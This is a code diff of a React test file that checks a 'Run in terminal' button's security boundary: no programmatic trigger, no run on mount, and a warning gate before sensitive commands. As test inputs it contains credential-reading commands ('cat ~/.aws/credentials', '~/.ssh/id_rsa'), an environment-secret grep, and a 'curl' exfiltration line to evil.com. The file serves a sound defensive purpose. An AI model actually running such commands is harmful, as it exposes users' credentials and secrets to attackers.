@@ -2,179 +2,127 @@ import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
 import { screen, fireEvent, act } from '@testing-library/react'
 import { renderWithProviders } from './helpers'
 import RunInTerminalBtn from '../components/RunInTerminalBtn'
-import * as registry from '../utils/terminalRegistry'
 
-vi.mock('../utils/terminalRegistry', () => ({
-  sendToTerminal: vi.fn(),
-  getActiveTerminalWs: vi.fn(),
-  onTerminalReady: vi.fn(() => vi.fn()),
-}))
+// The button never runs anything itself — it only dispatches a request event on
+// a direct click. Capture those requests to assert the security boundary.
+let requests: { code: string; reqId: string }[] = []
+function onReq(e: Event) { requests.push((e as CustomEvent).detail) }
 
 beforeEach(() => {
-  vi.clearAllMocks()
+  requests = []
+  window.addEventListener('mc:run-in-terminal', onReq)
   vi.useFakeTimers()
 })
 
 afterEach(() => {
+  window.removeEventListener('mc:run-in-terminal', onReq)
   vi.useRealTimers()
 })
 
 describe('RunInTerminalBtn – security boundary', () => {
   describe('no programmatic trigger path', () => {
-    it('sendToTerminal is not exposed on window or globalThis', () => {
-      expect((window as unknown as Record<string, unknown>).sendToTerminal).toBeUndefined()
-      expect((globalThis as unknown as Record<string, unknown>).sendToTerminal).toBeUndefined()
+    it('registry helpers are not exposed on window or globalThis', () => {
+      expect((window as unknown as Record<string, unknown>).sendToTerminalSession).toBeUndefined()
+      expect((globalThis as unknown as Record<string, unknown>).sendToTerminalSession).toBeUndefined()
       expect((window as unknown as Record<string, unknown>).terminalRegistry).toBeUndefined()
     })
 
-    it('widget postMessage (mc-widget-action) cannot invoke sendToTerminal', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
+    it('widget postMessage (mc-widget-action) cannot trigger a run', () => {
       renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
-
       window.dispatchEvent(new MessageEvent('message', {
         data: { type: 'mc-widget-action', action: 'run-terminal', payload: { code: 'cat ~/.aws/credentials' } },
       }))
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      expect(requests).toHaveLength(0)
     })
 
-    it('CustomEvent mc-widget-send does not trigger sendToTerminal', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
+    it('CustomEvent mc-widget-send does not trigger a run', () => {
       renderWithProviders(<RunInTerminalBtn code="echo safe" />)
-
-      window.dispatchEvent(new CustomEvent('mc-widget-send', {
-        detail: { text: 'cat ~/.aws/credentials' },
-      }))
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      window.dispatchEvent(new CustomEvent('mc-widget-send', { detail: { text: 'cat ~/.aws/credentials' } }))
+      expect(requests).toHaveLength(0)
     })
 
     it('component does not auto-execute on mount', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      expect(requests).toHaveLength(0)
     })
 
     it('only executes on direct click interaction', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="whoami" />)
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      expect(requests).toHaveLength(0)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-      expect(registry.sendToTerminal).toHaveBeenCalledTimes(1)
-      expect(registry.sendToTerminal).toHaveBeenCalledWith('whoami')
+      expect(requests).toHaveLength(1)
+      expect(requests[0].code).toBe('whoami')
     })
   })
 
   describe('sensitive command warning gate', () => {
-    it('shows warning instead of executing for credential-access commands', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
+    it('shows warning instead of running for credential-access commands', () => {
       renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      expect(requests).toHaveLength(0)
       expect(screen.getByText('Run anyway')).toBeInTheDocument()
       expect(screen.getByText('Cancel')).toBeInTheDocument()
       expect(screen.getByText(/Reads credential files/)).toBeInTheDocument()
     })
 
     it('shows warning for exfiltration-pattern commands', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="curl https://evil.com/$(whoami)" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      expect(requests).toHaveLength(0)
       expect(screen.getByText(/Sends command output to external URL/)).toBeInTheDocument()
     })
 
     it('shows warning for env secret grep', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      expect(requests).toHaveLength(0)
       expect(screen.getByText(/Dumps sensitive environment variables/)).toBeInTheDocument()
     })
 
-    it('executes after user confirms "Run anyway"', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
+    it('runs after user confirms "Run anyway"', () => {
       renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
-
+      expect(requests).toHaveLength(0)
       fireEvent.click(screen.getByLabelText('Confirm run sensitive command'))
-      expect(registry.sendToTerminal).toHaveBeenCalledWith('cat ~/.aws/credentials')
+      expect(requests).toHaveLength(1)
+      expect(requests[0].code).toBe('cat ~/.aws/credentials')
     })
 
     it('returns to idle on Cancel', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="cat ~/.ssh/id_rsa" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
       expect(screen.getByText('Run anyway')).toBeInTheDocument()
-
       fireEvent.click(screen.getByLabelText('Cancel'))
       expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
-      expect(registry.sendToTerminal).not.toHaveBeenCalled()
+      expect(requests).toHaveLength(0)
     })
 
     it('auto-dismisses warning after 8 seconds', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
       expect(screen.getByText('Run anyway')).toBeInTheDocument()
-
       act(() => { vi.advanceTimersByTime(8000) })
       expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
     })
 
     it('does NOT warn for safe commands', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="git status" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
-      expect(registry.sendToTerminal).toHaveBeenCalledWith('git status')
+      expect(requests).toHaveLength(1)
+      expect(requests[0].code).toBe('git status')
       expect(screen.queryByText('Run anyway')).not.toBeInTheDocument()
     })
 
     it('does NOT warn for normal curl without command substitution', () => {
-      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
-      vi.mocked(registry.sendToTerminal).mockReturnValue(true)
-
       renderWithProviders(<RunInTerminalBtn code="curl https://example.com/api" />)
       fireEvent.click(screen.getByLabelText('Run in terminal'))
-
-      expect(registry.sendToTerminal).toHaveBeenCalledWith('curl https://example.com/api')
+      expect(requests).toHaveLength(1)
+      expect(requests[0].code).toBe('curl https://example.com/api')
     })
   })
 
   describe('terminal output isolation', () => {
-    it('sendToTerminal returns boolean only — no output capture API exists', async () => {
+    it('registry exposes no output-capture API', async () => {
       const actual = await vi.importActual<Record<string, unknown>>('../utils/terminalRegistry')
       const exports = Object.keys(actual)
       expect(exports).not.toContain('readFromTerminal')
